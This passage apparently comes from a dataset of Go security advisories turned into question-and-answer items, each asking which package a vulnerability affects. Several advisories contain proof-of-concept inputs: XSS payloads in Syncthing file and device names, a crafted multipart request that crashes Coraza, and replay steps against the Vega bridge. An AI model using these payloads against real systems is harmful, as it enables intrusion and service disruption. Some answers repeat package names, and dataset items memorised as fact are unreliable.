SSO URL with an attack payload. If the attacker then tricked a user into visiting the maliciously crafted connection URL, the user\u2019s local machine would render the malicious payload, leading to a remote code execution. \n\nThis attack scenario can be mitigated through URL whitelisting as well as common anti-phishing resources.  \n\n### Solution\nOn March 21, 2023, Snowflake merged a patch that fixed a command injection vulnerability in the Snowflake Golang driver via SSO browser URL authentication. The vulnerability affected the Snowflake Golang driver before Version 1.6.19. We strongly recommend users upgrade to Version 1.6.19 as soon as possible via the following resources: [Go Snowflake Driver](https://docs.snowflake.com/en/developer-guide/golang/go-driver)\n\n### Additional Information\nIf you discover a security vulnerability in one of our products or websites, please report the issue to HackerOne. For more information, please see our [Vulnerability Disclosure Policy](https://hackerone.com/snowflake?type=team).. Top 1 search result is go:github.com/hashicorp/consul. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/snowflakedb/gosnowflake."}]}, {"id": "GHSA-w44m-8mv2-v78h", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: The cosmos-sdk module is affected by the vulnerability codenamed \"Barberry\".. Top 1 search result is go:github.com/nats-io/nats-server. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/cosmos/cosmos-sdk github.com/cosmos/cosmos-sdk."}]}, {"id": "GHSA-8vhc-hwhc-cpj4", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Impact\nA vulnerability was identified in which users with update privileges on a namespace, can move that namespace into a project they don't have access to. After the namespace transfer is completed, their previous permissions are still preserved, which enables them to gain access to project-specific resources (such as [project secrets](https://ranchermanager.docs.rancher.com/how-to-guides/new-user-guides/kubernetes-resources-setup/secrets#creating-secrets-in-projects)). In addition, resources in the namespace will now count toward the [quota limit](https://ranchermanager.docs.rancher.com/how-to-guides/advanced-user-guides/manage-projects/manage-project-resource-quotas/about-project-resource-quotas) of the new project, potentially causing availability issues.\n\nUser with roles `Project Owner` and `Project Member` on the source project can exploit this vulnerability; however, this would also apply to custom roles with similar privileges. \n\nThe patched version include an improved RBAC mechanism, which checks if the user has the correct permissions before the namespace move takes place.\n\n### Patches\nPatched versions include releases `2.6.13`, `2.7.4` and later versions.\n\n### Workarounds\nThere is no direct mitigation besides updating Rancher to a patched version.\n\n### For more information\nIf you have any questions or comments about this advisory:\n\n- Reach out to the [SUSE Rancher Security team](https://github.com/rancher/rancher/security/policy) for security related inquiries.\n- Open an issue in the [Rancher](https://github.com/rancher/rancher/issues/new/choose) repository.\n- Verify with our [support matrix](https://www.suse.com/suse-rancher/support-matrix/all-supported-versions/) and [product support lifecycle](https://www.suse.com/lifecycle/).. Top 1 search result is go:github.com/russellhaering/goxmldsig. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/rancher/rancher github.com/rancher/rancher."}]}, {"id": "GHSA-9rp6-23gf-4c3h", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ## Impact\n\n1. A compromised instance with shared folders could sync malicious files which contain arbitrary HTML and JavaScript in the name.\nIf the owner of another device looks over the shared folder settings and moves the mouse over the latest sync, a script could be executed to change settings for shared folders or add devices automatically.\n\n2. Adding a new device with a malicious name could embed HTML or JavaScript inside parts of the page.\n\n## Risk\n\nAs long as trusted devices are used, the risk is low.\nAdditionally, the web GUI is not used that often in daily use which reduces the likelihood of exploitation.\n\n## Details\n\n### 1. Field \"Latest Change\"\n\n* Open the web GUI at [http://127.0.0.1:8384/](http://127.0.0.1:8384/).\n* Create/Delete a file named ```<img src=a onerror=alert(123)>``` and sync it to the other instance.\n* Move your mouse over the latest change to trigger the tooltip.\n\n<img width=\"834\" alt=\"latest-change\" src=\"https://user-images.githubusercontent.com/9484134/205084362-20a8ec13-a88d-469f-bdf1-e5291c20f4c1.png\">\n\n##### Web browser source\n```html\n<span tooltip=\"\" data-original-title=\"\\&quot;><img src=a onerror=alert(123)> @ 2022-11-30 16:58:43\"\n    aria-describedby=\"tooltip409527\">\n    <!-- ngIf: !folderStats[folder.id].lastFile.deleted --><span translate=\"\"\n        translate-value-file=\"&quot;><img src=a onerror=alert(123)>\" ng-if=\"!folderStats[folder.id].lastFile.deleted\"\n        class=\"ng-scope\">Updated \"&gt;&lt;img src=a onerror=alert(123)&gt;</span>\n    <!-- end ngIf: !folderStats[folder.id].lastFile.deleted -->\n    <!-- ngIf: folderStats[folder.id].lastFile.deleted -->\n</span>\n<div class=\"tooltip fade top in\" role=\"tooltip\" id=\"tooltip409527\"\n    style=\"top: 446.033px; left: 318.3px; display: block;\">\n    <div class=\"tooltip-arrow\" style=\"left: 50%;\"></div>\n    <div class=\"tooltip-inner\">\\\"&gt;<img src=\"a\" onerror=\"alert(123)\"> @ 2022-11-30 16:58:43</div>\n</div>\n```\n\n##### Corresponding code in the project \n\nFile ````gui/default/index.html````:\n```html\n<tr ng-if=\"folder.type != 'sendonly' && folder.type != 'receiveencrypted' && folderStats[folder.id].lastFile && folderStats[folder.id].lastFile.filename\">\n    <th><span class=\"fas fa-fw fa-exchange-alt\"></span>&nbsp;<span translate>Latest Change</span></th>\n    <td class=\"text-right\">\n        <span tooltip data-original-title=\"{{folderStats[folder.id].lastFile.filename}} @ {{folderStats[folder.id].lastFile.at | date:'yyyy-MM-dd HH:mm:ss'}}\">\n        <span translate translate-value-file=\"{{folderStats[folder.id].lastFile.filename | basename}}\" ng-if=\"!folderStats[folder.id].lastFile.deleted\">Updated {%file%}</span>\n        <span translate translate-value-file=\"{{folderStats[folder.id].lastFile.filename | basename}}\" ng-if=\"folderStats[folder.id].lastFile.deleted\">Deleted {%file%}</span>\n        </span>\n    </td>\n</tr>\n```\n\nFile ````gui/default/syncthing/core/tooltipDirective.js````:  \n```javascript\nangular.module('syncthing.core')\n    .directive('tooltip', function () {\n        return {\n            restrict: 'A',\n            link: function (scope, element, attributes) {\n                $(element).tooltip({\n                    html: 'true'\n                });\n            }\n        };\n    });\n```\n\nThe attribute ```html``` should not be set to ```true``` or input sanitized.\n\n### 2. Field \"Shared With\"\n\n* Open the web GUI at [http://127.0.0.1:8384/](http://127.0.0.1:8384/).\n* Create a device with the following name ```fedora 1\"'><h1>Headline</h1><img src=x><script>alert(1)</script>```.\n* Add the device to another instance and share a folder.\n* Move your mouse over the malicious device name to trigger the tooltip.\n \n<img width=\"608\" alt=\"shared-with-1\" src=\"https://user-images.githubusercontent.com/9484134/205084172-8cab2d0e-3257-46d5-be81-41fbd7228e0c.png\">\n\n\n##### Web browser source  \n\n```html\n<span tooltip=\"\" data-original-title=\"fedora 1&quot;'><h1>Headline</h1><img src=x><script>alert(1)</script>  \"\n    ng-bind-html=\"sharesFolder(folder)\" class=\"ng-binding\" aria-describedby=\"tooltip348410\">fedora 1\"'&gt;<h1>Headline\n    </h1><img src=\"x\"></span>\n<div class=\"tooltip fade top\" role=\"tooltip\" id=\"tooltip348410\" style=\"top: 0px; left: 0px; display: block;\">\n    <div class=\"tooltip-arrow\" style=\"left: 50%;\"></div>\n    <div class=\"tooltip-inner\">fedora 1\"'&gt;<h1>Headline</h1><img src=\"x\">\n        <script>alert(1)</script>\n    </div>\n</div>\n```\n\n##### Corresponding code in the project \n\nFile ````gui/default/index.html````:\n\n```html\n<tr>\n    <th><span class=\"fas fa-fw fa-share-alt\"></span>&nbsp;<span translate>Shared With</span></th>\n    <td class=\"text-right\">\n        <span tooltip data-original-title=\"{{sharesFolder(folder)}} {{folderHasUnacceptedDevices(folder) ? '<br/>(<sup>1</sup>' + ('The remote device has not accepted sharing this folder.' | translate) + ')' : ''}} {{folderHasPausedDevices(folder) ? '<br/>(<sup>2</sup>' + ('The remote device has paused this folder.' | translate) + ')' : ''}}\" ng-bind-html=\"sharesFolder(folder)\"></span>\n    </td>\n</tr>\n```\n\nFile ````gui/default/syncthing/core/tooltipDirective.js````:  \n\n```javascript\nangular.module('syncthing.core')\n    .directive('tooltip', function () {\n        return {\n            restrict: 'A',\n            link: function (scope, element, attributes) {\n                $(element).tooltip({\n                    html: 'true'\n                });\n            }\n        };\n    });\n```\n\nThe attribute ```html``` should not be set to ```true``` or input sanitized.\n\n##### HTML Injection in \"Edit Folder\"\n\n<img width=\"672\" alt=\"shared-with-2\" src=\"https://user-images.githubusercontent.com/9484134/205084067-b33f8536-e350-4de1-86f6-3d4a12a683c3.png\">\n. Top 1 search result is go:github.com/satori/go.uuid. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/syncthing/syncthing."}]}, {"id": "GHSA-8rc9-vxjh-qjf2", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: A vulnerability exists that allows a malicious validator to trick the Vega network into re-processing past Ethereum events from Vega\u2019s Ethereum bridge. For example, a deposit to the collateral bridge for 100USDT that credits a party\u2019s general account on Vega, can be re-processed 50 times resulting in 5000USDT in that party\u2019s general account. This is without depositing any more than the original 100USDT on the bridge.\n\nDespite this exploit requiring access to a validator's Vega key, a validator key can be obtained at the small cost of 3000VEGA, the amount needed to announce a new node onto the network.\n\nThe steps to carry out this exploit are as follows:\n1. Cause an Ethereum event on one of the bridge contracts e.g a deposit to the collateral bridge, or the staking bridge\n2. This will result in the Ethereum-event-forwarder of each node to submit a ChainEvent transaction to the Vega network corresponding to that event\n3. Scrape the valid chain event transaction from the Tendermint block data using a node\u2019s Tendermint API\n4. Change the value of the `txId` field of the ChainEvent to any valid, but different, value\n5. Bundle the tweaked ChainEvent into a new transaction, sign it with a validator key and resubmit to the Vega network\n6. The fraudulent ChainEvent will be processed by Vega as if it were a new ChainEvent even though it did not occur on Ethereum\n\nThe key to this exploit is in step 4. The `txId` field of the ChainEvent is used when checking for ChainEvent resubmission, but NOT during the subsequent on-chain verification of the event. Therefore changing the `txId` of an existing ChainEvent is enough to by-pass the duplication check and for it to still be verified as a real event.\n\n### Impact\nThe impact of this exploit is dependent on the ChainEvent being manipulated. The below table describes each one:\n\n| Chain Event  | Allows | Consequence |\n| ------------- | ------------- | ------------- |\n| Deposit | Generation of unlimited funds of any asset  | Withdrawal of all assets |\n| Stake Deposit  | Delegate unlimited Vega to a single node  | A single node has controlling amount of voting power  |\n| Stake Removed  | Force a Validator node to drop below self-stake requirements  | Prevents reward payouts  |\n| Bridge Stop  | The Vega network to think the bridge is stopped  | Prevent anyone from withdrawing funds  |\n| Signer Removed  | The Vega network to think a validator nodes is not on the multisig contract  | Prevent reward payouts  |\n\n### Patches\nv0.71.6\n\n### Workarounds\nNo work around known, however there are mitigations in place should this vulnerability be exploited:\n\n- there are monitoring alerts, for `mainnet1`, in place to identify any issues of this nature including this vulnerability being exploited\n- the validators have the ability to stop the bridge thus stopping any withdrawals should this vulnerability be exploited\n\n### References\nN/A\n. Top 1 search result is go:github.com/hashicorp/vault. What is the affected package?"}, {"from": "gpt", "value": "The affected package is code.vegaprotocol.io/vega."}]}, {"id": "GHSA-c2pj-v37r-2p6h", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Summary\n\nDue to the misuse of `log.Fatalf`, the application using coraza crashed after receiving crafted requests from attackers.\n\n### Details\n\nhttps://github.com/corazawaf/coraza/blob/82157f85f24c6107667bf0f686b71a72aafdf8a5/internal/bodyprocessors/multipart.go#L26-L29\nThe bodyprocessors of multipart uses `log.Fatalf` to handle errors from the `mime.ParseMediaType`, but `log.Fatalf` calls `os.Exit` directly after logging the error.\nhttps://github.com/golang/go/blob/a031f4ef83edc132d5f49382bfef491161de2476/src/log/log.go#L288-L291\nThis means that the application will immediately crash after receiving a malicious request that triggers an error in `mime.ParseMediaType`.\n\n### PoC\n\nThe server can be demonstrated by https://github.com/corazawaf/coraza/tree/main/examples/http-server\n\nAfter sending this request\n```\nPOST / HTTP/1.1\nHost: 127.0.0.1:8090\nUser-Agent: curl/8.1.2\nAccept: */*\nContent-Length: 199\nContent-Type: multipart/form-data; boundary=------------------------5fa6351b877326a1; a=1; a=2\nConnection: close\n\n--------------------------5fa6351b877326a1\nContent-Disposition: form-data; name=\"file\"; filename=\"123\"\nContent-Type: application/octet-stream\n\n123\n\n--------------------------5fa6351b877326a1--\n\n```\nThe server will crash immediately. The `a=1; a=2` in `Content-Type` makes `mime: duplicate parameter name` error.\n\n### Impact\n\nI believe the vulnerability was introduced by the following commit: https://github.com/corazawaf/coraza/commit/24af0c8cf4f10bab558740b595712be3b85493ec.\n\n### Mitigation\n\nThe error from `mime.ParseMediaType` should return directly.. Top 1 search result is go:github.com/seccomp/libseccomp-golang. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/corazawaf/coraza/v3 github.com/corazawaf/coraza/v2."}]}, {"id": "GHSA-8jxm-xp43-qh3q", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Summary\nThe current cryptography implementation in Sliver up to version 1.5.39 allows a MitM with access to the corresponding implant binary to execute arbitrary codes on implanted devices via intercepted and crafted responses. (Reserved CVE ID: CVE-2023-34758)\n\n### Details\nPlease see [the PoC repo](https://github.com/tangent65536/Slivjacker).\n\n### PoC\nPlease also see [the PoC repo](https://github.com/tangent65536/Slivjacker).\nTo setup a simple PoC environment,  \n 1. Generate an implant with its C2 set to the PoC server's address and copy the embedded private implant key and public server key into the config json.  \n 2. Run the implant on a separate VM and a `notepad.exe` window should pop up on the implanted VM.  \n\n### Impact\nA successful attack grants the attacker permission to execute arbitrary code on the implanted device.  \n  \n### References\nhttps://github.com/BishopFox/sliver/blob/master/implant/sliver/cryptography/implant.go  \nhttps://github.com/BishopFox/sliver/blob/master/implant/sliver/cryptography/crypto.go  \nhttps://github.com/tangent65536/Slivjacker  \n\n### Credits\n[Ting-Wei Hsieh](https://github.com/tangent65536) from [CHT Security Co. Ltd.](https://www.chtsecurity.com/?lang=en). Top 1 search result is go:code.cloudfoundry.org/gorouter. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/bishopfox/sliver."}]}, {"id": "GHSA-c57c-7hrj-6q6v", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: Consul and Consul Enterprise's cluster peering implementation contained a flaw whereby a peer cluster with service of the same name as a local service could corrupt Consul state, resulting in denial of service. This vulnerability was resolved in Consul 1.14.5, and 1.15.3. Top 1 search result is go:github.com/goharbor/harbor. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/hashicorp/consul github.com/hashicorp/consul."}]}, {"id": "GHSA-9m3v-v4r5-ppx7", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Impact\nAn attacker who controls or compromises a registry can make the registry serve an infinite number of signatures for the artifact, causing a denial of service to the host machine running `notation verify`.\n\n### Patches\nThe problem has been fixed in the release [v1.0.0-rc.6](https://github.com/notaryproject/notation/releases/tag/v1.0.0-rc.6). Users should upgrade their notation packages to [v1.0.0-rc.6](https://github.com/notaryproject/notation/releases/tag/v1.0.0-rc.6) or above.\n\n### Workarounds\nUser should use secure and trusted container registries.\n\n### Credits\nThe `notation` project would like to thank Adam Korczynski (@AdamKorcz) for responsibly disclosing the issue found during an security audit (facilitated by OSTIF and sponsored by CNCF) and Shiwei Zhang (@shizhMSFT) for root cause analysis.. Top 1 search result is go:github.com/hpcng/singularity. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/notaryproject/notation."}]}, {"id": "GHSA-vfrj-fv6p-3cpf", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: The `tproxy` server is vulnerable to a drive-by command injection. An attacker may fool a victim into visiting a malicious web page which will trigger requests to the local `tproxy` service leading to remote code execution.. Top 1 search result is go:github.com/cloudfoundry/archiver. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/txthinking/brook."}]}, {"id": "GHSA-m54h-5x5f-5m6r", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Impact\nAny user making a negative authorization decision based on the results of a LookupResources request with 1.22.0 is affected.\n\nFor example, using `LookupResources` to find a list of resources to allow access to be okay: some subjects that should have access to a resource may not. But if using `LookupResources` to find a list of banned resources instead, then some users that shouldn't have access may.\n\nGenerally, `LookupResources` is not and should not be used to gate access in this way - that's what the `Check` API is for. Additionally, version 1.22.0 has included a warning about this bug since its initial release.\n\n### Workarounds\nAvoid using `LookupResources` for negative authorization decisions if using `1.22.0`. \n\n### Patches\nThe only affected release is [v1.22.0](https://github.com/authzed/spicedb/releases/tag/v1.22.0), and it is patched in [v1.22.2](https://github.com/authzed/spicedb/releases/tag/v1.22.2) (there is no v1.22.1 release, though there is a git tag).\n\n### References\n- https://github.com/authzed/spicedb/pull/1397\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [SpiceDB](https://github.com/authzed/spicedb)\n* Ask a question in the [SpiceDB Discord](https://authzed.com/discord)\n. Top 1 search result is go:github.com/kubernetes/kubernetes. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/authzed/spicedb."}]}, {"id": "GHSA-mpv3-g8m3-3fjc", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: Grafana is validating Azure AD accounts based on the email claim. \n\nOn Azure AD, the profile email field is not unique and can be easily modified. \n\nThis leads to account takeover and authentication bypass when Azure AD OAuth is configured with a multi-tenant app. \n\n. Top 1 search result is go:github.com/ory/fosite. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/grafana/grafana github.com/grafana/grafana github.com/grafana/grafana github.com/grafana/grafana."}]}, {"id": "GHSA-hh54-53m7-7ffj", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: alist <=3.16.3 is vulnerable to Incorrect Access Control. Low privilege accounts can upload any file.. Top 1 search result is go:github.com/pires/go-proxyproto. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/alist-org/alist/v3."}]}, {"id": "GHSA-rqjq-ww83-wv5c", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: Consul and Consul Enterprise allowed any user with service:write permissions to use Envoy extensions configured via service-defaults to patch remote proxy instances that target the configured service, regardless of whether the user has permission to modify the service(s) corresponding to those modified proxies.. Top 1 search result is go:golang.org/x/crypto. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/hashicorp/consul."}]}, {"id": "GHSA-74j8-w7f9-pp62", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Summary\nImproper configuration of RBAC permissions resulted in obtaining cluster control permissions, which could control the entire cluster deployed with Sealos, as well as hundreds of pods and other resources within the cluster.\n\n### Details\ndetail's is disable by publish.\n\n### PoC\ndetail's is disable by publish.\n\n### Impact\n+ sealos public cloud user\n+ CWE-287 Improper Authentication\n. Top 1 search result is go:github.com/pion/dtls. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/labring/sealos."}]}, {"id": "GHSA-gq98-53rq-qr5h", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: Vault and Vault Enterprise's (Vault) key-value v2 (kv-v2) diff viewer allowed HTML injection into the Vault web UI through key values. This vulnerability, CVE-2023-2121, is fixed in Vault 1.14.0, 1.13.3, 1.12.7, and 1.11.11.. Top 1 search result is go:gopkg.in/macaron.v1. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/hashicorp/vault github.com/hashicorp/vault github.com/hashicorp/vault."}]}, {"id": "GHSA-6wrf-mxfj-pf5p", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: [Moby](https://mobyproject.org/) is an open source container framework developed by Docker Inc. that is distributed as Docker, Mirantis Container Runtime, and various other downstream projects/products. The Moby daemon component (`dockerd`), which is developed as [moby/moby](https://github.com/moby/moby) is commonly referred to as *Docker*.\n\nSwarm Mode, which is compiled in and delivered by default in `dockerd` and is thus present in most major Moby downstreams, is a simple, built-in container orchestrator that is implemented through a combination of [SwarmKit](https://github.com/moby/swarmkit) and supporting network code.\n\nThe `overlay` network driver is a core feature of Swarm Mode, providing isolated virtual LANs that allow communication between containers and services across the cluster. This driver is an implementation/user of [VXLAN](https://en.wikipedia.org/wiki/Virtual_Extensible_LAN), which encapsulates link-layer (Ethernet) frames in UDP datagrams that tag the frame with a VXLAN Network ID (VNI) that identifies the originating overlay network. In addition, the overlay network driver supports an optional, off-by-default encrypted mode, which is especially useful when VXLAN packets traverses an untrusted network between nodes.\n\nEncrypted overlay networks function by encapsulating the VXLAN datagrams through the use of the [IPsec Encapsulating Security Payload](https://en.wikipedia.org/wiki/IPsec#Encapsulating_Security_Payload) protocol in [Transport mode](https://en.wikipedia.org/wiki/IPsec#Transport_mode). By deploying IPSec encapsulation, encrypted overlay networks gain the additional properties of source authentication through cryptographic proof, data integrity through check-summing, and confidentiality through encryption.\n\nWhen setting an endpoint up on an encrypted overlay network, Moby installs three [iptables](https://www.netfilter.org/projects/iptables/index.html) (Linux kernel firewall) rules that enforce both incoming and outgoing IPSec. These rules rely on the `u32` iptables extension provided by the `xt_u32` kernel module to directly filter on a VXLAN packet's VNI field, so that IPSec guarantees can be enforced on encrypted overlay networks without interfering with other overlay networks or other users of VXLAN.\n\nThe `overlay` driver dynamically and lazily defines the kernel configuration for the VXLAN network on each node as containers are attached and detached. Routes and encryption parameters are only defined for destination nodes that participate in the network. The iptables rules that prevent encrypted overlay networks from accepting unencrypted packets are not created until a peer is available with which to communicate.\n\n## Impact\nEncrypted overlay networks silently accept cleartext VXLAN datagrams that are tagged with the VNI of an encrypted overlay network. As a result, it is possible to inject arbitrary Ethernet frames into the encrypted overlay network by encapsulating them in VXLAN datagrams. The implications of this can be quite dire, and [GHSA-vwm3-crmr-xfxw](https://github.com/moby/moby/security/advisories/GHSA-vwm3-crmr-xfxw) should be referenced for a deeper exploration.\n\n## Patches\nPatches are available in Moby releases 23.0.3, and 20.10.24. As Mirantis Container Runtime's 20.10 releases are numbered differently, users of that platform should update to 20.10.16.\n\n## Workarounds\n* In multi-node clusters, deploy a global \u2018pause\u2019 container for each encrypted overlay network, on every node. For example, use the `registry.k8s.io/pause` image and a `--mode global` service.\n* For a single-node cluster, do not use overlay networks of any sort. Bridge networks provide the same connectivity on a single node and have no multi-node features.\nThe Swarm ingress feature is implemented using an overlay network, but can be disabled by publishing ports in `host` mode instead of `ingress` mode (allowing the use of an external load balancer), and removing the `ingress` network.\n* If encrypted overlay networks are in exclusive use, block UDP port 4789 from traffic that has not been validated by IPSec. For example, `iptables -A INPUT -m udp \u2014-dport 4789 -m policy --dir in --pol none -j DROP`.\n\n## Background\n* This issue was discovered while characterizing and mitigating [CVE-2023-28840](https://github.com/moby/moby/security/advisories/GHSA-232p-vwff-86mp) and [CVE-2023-28841](https://github.com/moby/moby/security/advisories/GHSA-33pg-m6jh-5237).\n\n## Related\n* [CVE-2023-28841: Encrypted overlay network traffic may be unencrypted](https://github.com/moby/moby/security/advisories/GHSA-33pg-m6jh-5237)\n* [CVE-2023-28840: Encrypted overlay network may be unauthenticated](https://github.com/moby/moby/security/advisories/GHSA-232p-vwff-86mp)\n* [GHSA-vwm3-crmr-xfxw: The Swarm VXLAN port may be exposed to attack due to ambiguous documentation](https://github.com/moby/moby/security/advisories/GHSA-vwm3-crmr-xfxw)\n* [GHSA-gvm4-2qqg-m333: Security issues in encrypted overlay networks](https://github.com/moby/libnetwork/security/advisories/GHSA-gvm4-2qqg-m333) (libnetwork). Top 1 search result is go:github.com/buger/jsonparser. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/docker/docker github.com/docker/docker."}]}, {"id": "GHSA-xq3x-grrj-fj6x", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: sjqzhang go-fastdfs up to 1.4.3 is vulnerable to path traversal in the function upload of the file `/group1/upload` of the component `File Upload Handler`. The attack may be launched remotely and the exploit has been disclosed to the public and may be used.. Top 1 search result is go:gogs.io/gogs. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/sjqzhang/go-fastdfs."}]}, {"id": "GHSA-j4rf-7357-f4cg", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Impact\nThere is an ext4 use-after-free flaw described in CVE-2022-1184 that is exploitable through versions of Apptainer < 1.1.0 and installations that include apptainer-suid < 1.1.8 on older operating systems where that CVE has not been patched.  That includes Red Hat Enterprise Linux 7, Debian 10 buster (unless the linux-5.10 package is installed), Ubuntu 18.04 bionic and Ubuntu 20.04 focal.  Use-after-free flaws in the kernel can be used to attack the kernel for denial of service and potentially for privilege escalation.\n\n### Background\nHistorically there have been many CVEs published for extfs and a smaller number for squashfs, including serious use-after-free and buffer overrun vulnerabilities, that are scored as \"Moderate\" or \"Low\" impact only because unprivileged users were assumed to not have write access to the raw data.  Because of those ratings, vendors treat such CVEs as low urgency and either delay a patch until their next major release or never patch older but still supported operating systems at all.  Many Linux distributions automatically mount user-writable USB-drive volumes, but those are considered low risk because they require physical access to the machine.  However, since setuid-root installations of Apptainer by default allow all users to mount any extfs (specifically, ext3, which is implemented by the ext4 driver) and squashfs filesystem using kernel drivers even though the users have write access to the raw data, the setuid-root installations raise the severity of such unpatched CVEs.  \n\nCVE-2022-1184 is currently such an unpatched CVE, at least on the above listed operating systems.  The descriptions from the operating system vendors about the CVE (referenced below) are incomplete, saying only that it allows a local attacker with user privilege to cause a denial of service.  Normally users would not be able to cause it because they cannot modify the filesystem image, and normally vulnerabilities that involve kernel memory corruption by unprivileged users are considered high severity even when there is not yet a known privilege escalation because someone with sufficient kernel knowledge can usually turn such a corruption into a privilege escalation. \n\nRed Hat did not list RHEL7 as vulnerable, but they also did not list it as unaffected, and testing confirmed that a filesystem image could be corrupted to get past the check inserted into the filesystem driver to fix the vulnerability (patches linked below).\n\nAll published squashfs CVEs have been patched in currently supported major operating systems.\n\n### Patches\nApptainer 1.1.8 includes a patch that by default disables mounting of extfs filesystem types in setuid-root mode, while continuing to allow mounting of extfs filesystems in non-setuid \"rootless\" mode using fuse2fs.\n\n### Workarounds\nThese workarounds are possible:\n1. Either do not install apptainer-suid (for versions 1.1.0 through 1.1.7) or set `allow setuid = no` in apptainer.conf.  This requires having unprivileged user namespaces enabled and except for apptainer 1.1.x versions will disallow mounting of sif files, extfs files, and squashfs files in addition to other, less significant impacts.  (Encrypted sif files are also not supported unprivileged in apptainer 1.1.x.)\n2. Alternatively, use the `limit containers` options in apptainer.conf/singularity.conf to limit sif files to trusted users, groups, and/or paths.  (The option `allow container extfs = no` disallows mounting extfs overlay files but does not disallow mounting of extfs overlay partitions inside SIF files, so it does not help work around the problem.)\n\n### References\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-1184\nhttps://access.redhat.com/security/cve/cve-2022-1184\nhttps://security-tracker.debian.org/tracker/CVE-2022-1184\nhttps://ubuntu.com/security/CVE-2022-1184\nKernel patches for CVE-2022-1184:\nhttps://github.com/torvalds/linux/commit/65f8ea4cd57dbd46ea13b41dc8bac03176b04233\nhttps://github.com/torvalds/linux/commit/61a1d87a324ad5e3ed27c6699dfc93218fcf3201\n\n------\n\n## Addendum 30 May 2023\n\nNew information has become available: many ext4 filesytem vulnerabilities similar to the one in CVE-2022-1184 continue to be found, and most of them do not ever have a CVE assigned.  The way to locate them is to search for \"syzbot\" in linux kernel commit messages under fs/ext4.  \"syzbot\" is a public automated system for finding kernel bugs.  Especially when syzbot reports are labeled \"KASAN\" (Kernel Address Sanitizer) and especially if they involve memory corruption including \"use after free\", \"out of bounds\", or \"user-memory-access\", they are vulnerabilities that can potentially be turned into privilege escalation when an unprivileged user has write access to the underlying data.\n\nIn particular there are two such commits from this month, May 2023, referenced below.  They both have commit messages describing a situation of write access to the underlying data while the kernel has that data mounted as a filesystem.  These commits have been backported to currently maintained kernel lines in versions 4.19.293 and 5.4.243, but since they are considered moderate severity, most common OS distributions do not include them immediately.  For example since RHEL9.2 was recently announced, they are not likely to be available in RHEL9 until 9.3 is released in about another 6 months.  Therefore if system administrators want to be protected against these vulnerabilities while still allowing ext4 filesystem mounts through setuid-root apptainer, they should watch for these types of commits and whenever such commits are released the administrators should update to the latest currently maintained kernel version (bypassing their OS vendor's distribution) and reboot.\n\nhttps://github.com/torvalds/linux/commit/2220eaf90992c11d888fe771055d4de3303\nhttps://github.com/torvalds/linux/commit/4f04351888a83e595571de672e0a4a8b74f\nhttps://lwn.net/Articles/932137/\nhttps://lwn.net/Articles/932136/. Top 1 search result is go:github.com/rancher/rancher. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/apptainer/apptainer."}]}, {"id": "GHSA-9wh7-397j-722m", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Impact\nIronic and ironic-inspector deployed within Baremetal Operator using the included `deploy.sh` store their `.htpasswd` files as ConfigMaps instead of Secrets. This causes the plain-text username and hashed password to be readable by anyone having a cluster-wide read-access to the management cluster, or access to the management cluster's Etcd storage.\n\n### Patches\nThis issue is patched in [baremetal-operator PR#1241](https://github.com/metal3-io/baremetal-operator/pull/1241), and is included in BMO release 0.3.0 onwards.\n\n### Workarounds\nUser may modify the kustomizations and redeploy the BMO, or recreate the required ConfigMaps as Secrets per instructions in [baremetal-operator PR#1241](https://github.com/metal3-io/baremetal-operator/pull/1241)\n. Top 1 search result is go:github.com/cloudflare/cloudflared. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/metal3-io/baremetal-operator."}]}, {"id": "GHSA-735r-hv67-g38f", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Impact\nUsers can either intentionally or inadvertently create a keyspace containing `/` characters such that from that point on, anyone who tries to view keyspaces from VTAdmin will receive an error. Trying to list all the keyspaces using `vtctldclient 